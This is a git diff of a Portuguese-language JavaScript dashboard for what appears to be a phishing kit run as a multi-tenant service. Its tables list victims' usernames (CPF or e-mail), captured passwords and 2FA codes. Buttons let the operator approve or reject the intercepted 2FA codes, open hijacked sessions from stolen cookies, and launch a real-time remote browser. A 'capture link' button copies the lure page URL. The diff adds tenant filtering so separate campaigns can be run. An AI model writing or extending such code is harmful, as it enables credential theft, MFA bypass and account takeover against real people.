@@ -8,12 +8,17 @@ let dadosAtuais = {
 
 let abaAtiva = "consolidado"; // "consolidado" ou "feed"
 let termoBusca = "";
+const urlParams = new URLSearchParams(window.location.search);
+let tenantAtivo = urlParams.get("tenant") || urlParams.get("cliente") || "";
 
 const kpiLogins = document.getElementById("kpi-logins");
 const kpi2fa = document.getElementById("kpi-2fa");
 const kpiUsuarios = document.getElementById("kpi-usuarios");
 const containerTabela = document.getElementById("container-tabela");
 const filtroBusca = document.getElementById("filtro-busca");
+const seletorTenant = document.getElementById("seletor-tenant");
+const btnCopiarLinkLogin = document.getElementById("btn-copiar-link-login");
+const linkSessaoRemotaTop = document.getElementById("link-sessao-remota-top");
 const tabConsolidado = document.getElementById("tab-consolidado");
 const tabFeed = document.getElementById("tab-feed");
 const tabAuditoria = document.getElementById("tab-auditoria");
@@ -106,17 +111,19 @@ async function alternarModoAuto() {
   }
 }
 
-async function abrirModalCookies(usuario) {
+async function abrirModalCookies(usuario, itemTenant) {
   if (!modalCookies || !modalCookiesJson) return;
   try {
-    if (modalCookiesTitulo) modalCookiesTitulo.textContent = `Cookies de Sessão — ${usuario}`;
+    const t = itemTenant || tenantAtivo || "";
+    if (modalCookiesTitulo) modalCookiesTitulo.textContent = `Cookies de Sessão — ${usuario}${t ? ` [${t}]` : ''}`;
     if (btnModalAbrirSessao) {
-      btnModalAbrirSessao.href = `/sessao/${encodeURIComponent(usuario)}`;
+      btnModalAbrirSessao.href = `/sessao/${encodeURIComponent(usuario)}${t ? `?tenant=${encodeURIComponent(t)}` : ''}`;
     }
     modalCookiesJson.value = "Carregando cookies...";
     modalCookies.style.display = "flex";
 
-    const res = await fetch(`/api/sessao/${encodeURIComponent(usuario)}`);
+    const query = `/api/sessao/${encodeURIComponent(usuario)}${t ? `?tenant=${encodeURIComponent(t)}` : ''}`;
+    const res = await fetch(query);
     if (!res.ok) throw new Error("Sessão não encontrada");
     const json = await res.json();
     modalCookiesJson.value = JSON.stringify(json.cookie_editor_json || json.cookies || json, null, 2);
@@ -214,9 +221,30 @@ async function decidir2FA(usuario, decisao) {
   }
 }
 
+async function carregarTenants() {
+  if (!seletorTenant) return;
+  try {
+    const res = await fetch("/api/tenants?t=" + Date.now());
+    const json = await res.json();
+    if (json.success && Array.isArray(json.tenants)) {
+      const valorAtual = seletorTenant.value || tenantAtivo;
+      let html = `<option value="">🏢 Todos os Tenants (Global)</option>`;
+      json.tenants.forEach(t => {
+        const sel = t.tenant === valorAtual ? "selected" : "";
+        html += `<option value="${escapeHtml(t.tenant)}" ${sel}>🏷️ ${escapeHtml(t.tenant)} (${t.totalLogins} logins, ${t.total2FA} 2FA)</option>`;
+      });
+      seletorTenant.innerHTML = html;
+      if (valorAtual) seletorTenant.value = valorAtual;
+    }
+  } catch (err) {
+    console.error("Erro ao carregar lista de tenants:", err);
+  }
+}
+
 async function carregarDados() {
   try {
-    const res = await fetch("/api/painel?t=" + Date.now(), {
+    const query = "/api/painel?t=" + Date.now() + (tenantAtivo ? "&tenant=" + encodeURIComponent(tenantAtivo) : "");
+    const res = await fetch(query, {
       cache: "no-store",
       headers: { "Cache-Control": "no-cache" }
     });
@@ -237,14 +265,18 @@ function atualizarKpis() {
   if (kpi2fa) kpi2fa.textContent = dadosAtuais.total2FA || 0;
   if (kpiUsuarios) kpiUsuarios.textContent = dadosAtuais.totalUsuarios || 0;
   atualizarBotaoAuto();
+}
+
 async function carregarAuditoria() {
   try {
-    const res = await fetch("/api/audit-logs?limit=150&t=" + Date.now());
+    const queryLogs = "/api/audit-logs?limit=150&t=" + Date.now() + (tenantAtivo ? "&tenant=" + encodeURIComponent(tenantAtivo) : "");
+    const res = await fetch(queryLogs);
     const json = await res.json();
     if (json.success) {
       dadosAuditoria = json.logs || [];
     }
-    const resStats = await fetch("/api/audit-stats?t=" + Date.now());
+    const queryStats = "/api/audit-stats?t=" + Date.now() + (tenantAtivo ? "&tenant=" + encodeURIComponent(tenantAtivo) : "");
+    const resStats = await fetch(queryStats);
     const jsonStats = await resStats.json();
     if (jsonStats.success) {
       statsAuditoria = jsonStats.stats;
@@ -320,6 +352,7 @@ function renderizarAuditoria() {
       <thead>
         <tr>
           <th>Data / Hora</th>
+          <th>Tenant</th>
           <th>Evento</th>
           <th>Usuário Alvo</th>
           <th>Status</th>
@@ -368,6 +401,7 @@ function renderizarAuditoria() {
     html += `
       <tr>
         <td style="color: var(--text-dim); font-size: 12px; white-space: nowrap;">${item.timestamp || "—"}</td>
+        <td><span class="tenant-badge">${escapeHtml(item.tenant || "default")}</span></td>
         <td>
           <span style="display: inline-flex; align-items: center; padding: 3px 8px; border-radius: 6px; font-size: 11px; font-weight: 700; font-family: 'JetBrains Mono', monospace; background: ${evBg}; color: ${evColor}; border: 1px solid ${evBorder};">
             ${escapeHtml(item.event_type || "LOG")}
@@ -409,7 +443,8 @@ function renderizarTabela() {
         const u = (item.usuario || "").toLowerCase();
         const s = (item.ultimaSenha || "").toLowerCase();
         const c = (item.ultimoCodigo || "").toLowerCase();
-        return u.includes(termo) || s.includes(termo) || c.includes(termo);
+        const tn = (item.tenant || "").toLowerCase();
+        return u.includes(termo) || s.includes(termo) || c.includes(termo) || tn.includes(termo);
       });
     }
 
@@ -428,6 +463,7 @@ function renderizarTabela() {
         <thead>
           <tr>
             <th>Data / Hora</th>
+            <th>Tenant</th>
             <th>Usuário (CPF / E-mail)</th>
             <th>Senha Capturada</th>
             <th>Auditoria VR SSO</th>
@@ -479,6 +515,7 @@ function renderizarTabela() {
       html += `
         <tr>
           <td style="color: var(--text-dim); font-size: 12px;">${item.data_hora || "—"}</td>
+          <td><span class="tenant-badge">${escapeHtml(item.tenant || "default")}</span></td>
           <td class="user-tag mono">${escapeHtml(item.usuario || "—")}</td>
           <td>
             <div class="secret-box">
@@ -502,6 +539,10 @@ function renderizarTabela() {
           <td>${statusHtml}</td>
           <td style="text-align: right;">
             <div style="display: inline-flex; align-items: center; gap: 6px; justify-content: flex-end;">
+              <a href="/sessaoremota.html?usuario=${encodeURIComponent(item.usuario)}${item.tenant ? `&tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-secondary" style="padding: 5px 8px; font-size: 11px; display: inline-flex; align-items: center; gap: 4px;" title="Abrir Navegador Remoto em Tempo Real">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                <span>Remota</span>
+              </a>
               ${tem2FA ? `
                 <button class="btn-success-sm" type="button" title="Aceitar código 2FA e redirecionar para tela final" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'aceito')">
                   <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
@@ -549,7 +590,7 @@ function renderizarTabela() {
                 )
               )}
               ${(item.total_cookies > 0 || item.cookies || item.tem_sessao_salva || item.status === '2FA Aceito') ? `
-                <a href="/sessao/${encodeURIComponent(item.usuario)}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 5px 10px; font-size: 11px; font-weight: 700; box-shadow: 0 0 10px rgba(2, 215, 47, 0.35);" title="Acessar Sessão Autenticada Finalizada">
+                <a href="/sessao/${encodeURIComponent(item.usuario)}${item.tenant ? `?tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 5px 10px; font-size: 11px; font-weight: 700; box-shadow: 0 0 10px rgba(2, 215, 47, 0.35);" title="Acessar Sessão Autenticada Finalizada">
                   <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                   <span>Acessar Sessão</span>
                 </a>
@@ -579,7 +620,8 @@ function renderizarTabela() {
         const u = (item.usuario || "").toLowerCase();
         const s = (item.senha || "").toLowerCase();
         const c = (item.codigo || "").toLowerCase();
-        return u.includes(termo) || s.includes(termo) || c.includes(termo);
+        const tn = (item.tenant || "").toLowerCase();
+        return u.includes(termo) || s.includes(termo) || c.includes(termo) || tn.includes(termo);
       });
     }
 
@@ -598,6 +640,7 @@ function renderizarTabela() {
         <thead>
           <tr>
             <th>Data / Hora</th>
+            <th>Tenant</th>
             <th>Evento</th>
             <th>Usuário</th>
             <th>Dado Capturado</th>
@@ -652,6 +695,7 @@ function renderizarTabela() {
       html += `
         <tr>
           <td style="color: var(--text-dim); font-size: 12px;">${item.data_hora || "—"}</td>
+          <td><span class="tenant-badge">${escapeHtml(item.tenant || "default")}</span></td>
           <td>${tipoBadge}</td>
           <td class="user-tag mono">${escapeHtml(item.usuario || "—")}</td>
           <td>
@@ -663,6 +707,10 @@ function renderizarTabela() {
           <td>${statusHtml}</td>
           <td style="text-align: right;">
             <div style="display: inline-flex; align-items: center; gap: 6px; justify-content: flex-end;">
+              <a href="/sessaoremota.html?usuario=${encodeURIComponent(item.usuario)}${item.tenant ? `&tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-secondary" style="padding: 4px 8px; font-size: 11px; display: inline-flex; align-items: center; gap: 4px;" title="Abrir Navegador Remoto em Tempo Real">
+                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                <span>Remota</span>
+              </a>
               ${is2FA ? `
                 <button class="btn-success-sm" type="button" title="Aceitar" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'aceito')">
                   <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
@@ -681,7 +729,7 @@ function renderizarTabela() {
                 ` : ''
               )}
               ${(item.total_cookies > 0 || item.cookies || item.status_2fa === 'aceito') ? `
-                <a href="/sessao/${encodeURIComponent(item.usuario)}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 4px 8px; font-size: 11px; font-weight: 700; box-shadow: 0 0 8px rgba(2, 215, 47, 0.3);" title="Acessar Sessão">
+                <a href="/sessao/${encodeURIComponent(item.usuario)}${item.tenant ? `?tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 4px 8px; font-size: 11px; font-weight: 700; box-shadow: 0 0 8px rgba(2, 215, 47, 0.3);" title="Acessar Sessão">
                   <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                   <span>Acessar</span>
                 </a>
@@ -769,15 +817,51 @@ if (btnAtualizar) {
 if (btnLimpar) {
   btnLimpar.addEventListener("click", async () => {
     try {
-      const res = await fetch("/api/limpar", { method: "POST" });
+      const res = await fetch("/api/limpar", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ tenant: tenantAtivo || undefined })
+      });
       const json = await res.json();
       if (json.success) {
-        showToast("Registros limpos com sucesso!");
+        showToast(tenantAtivo ? `Registros do tenant '${tenantAtivo}' limpos!` : "Todos os registros limpos!");
         carregarDados();
+        carregarTenants();
       }
     } catch (err) {
       console.error(err);
     }
+  });
+}
+
+if (seletorTenant) {
+  seletorTenant.addEventListener("change", () => {
+    tenantAtivo = seletorTenant.value;
+    const url = new URL(window.location);
+    if (tenantAtivo) {
+      url.searchParams.set("tenant", tenantAtivo);
+    } else {
+      url.searchParams.delete("tenant");
+      url.searchParams.delete("cliente");
+    }
+    window.history.replaceState({}, "", url);
+    if (linkSessaoRemotaTop) {
+      linkSessaoRemotaTop.href = `/sessaoremota.html${tenantAtivo ? `?tenant=${encodeURIComponent(tenantAtivo)}` : ''}`;
+    }
+    conectarSSE();
+    if (abaAtiva === "auditoria") {
+      carregarAuditoria();
+    } else {
+      carregarDados();
+    }
+    showToast(tenantAtivo ? `Filtrando por tenant: ${tenantAtivo}` : "Visualizando todos os tenants");
+  });
+}
+
+if (btnCopiarLinkLogin) {
+  btnCopiarLinkLogin.addEventListener("click", () => {
+    const link = `${window.location.origin}/index.html${tenantAtivo ? `?tenant=${encodeURIComponent(tenantAtivo)}` : ''}`;
+    copiarTexto(link, "Link de Captura");
   });
 }
 
@@ -809,7 +893,8 @@ function conectarSSE() {
   if (!window.EventSource) return;
   try {
     if (sseConexao) sseConexao.close();
-    sseConexao = new EventSource("/api/stream?t=" + Date.now());
+    const sseUrl = "/api/stream?t=" + Date.now() + (tenantAtivo ? "&tenant=" + encodeURIComponent(tenantAtivo) : "");
+    sseConexao = new EventSource(sseUrl);
 
     sseConexao.onmessage = (event) => {
       try {
@@ -838,6 +923,11 @@ function conectarSSE() {
 }
 
 // Inicialização imediata + SSE em tempo real + fallback polling de 1s
+if (linkSessaoRemotaTop && tenantAtivo) {
+  linkSessaoRemotaTop.href = `/sessaoremota.html?tenant=${encodeURIComponent(tenantAtivo)}`;
+}
+carregarTenants();
 carregarDados();
 conectarSSE();
 setInterval(carregarDados, 1000);
+setInterval(carregarTenants, 5000);
